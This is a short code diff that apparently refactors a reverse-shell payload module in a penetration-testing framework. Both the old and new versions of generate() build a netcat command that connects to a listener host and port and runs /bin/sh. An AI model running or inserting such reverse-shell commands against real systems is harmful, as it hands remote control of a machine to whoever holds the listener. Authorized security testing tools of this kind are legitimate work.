@@ -24,8 +24,7 @@ class Exploit(payloads.Payload):
     shell_binary = exploits.Option('/bin/sh', 'Shell')
 
     def generate(self):
-        self.payload = "{} {} {} -e {}".format(self.netcat_binary,
-                                               self.lhost,
-                                               self.lport,
-                                               self.shell_binary)
-
+        return "{} {} {} -e {}".format(self.netcat_binary,
+                                       self.lhost,
+                                       self.lport,
+                                       self.shell_binary)
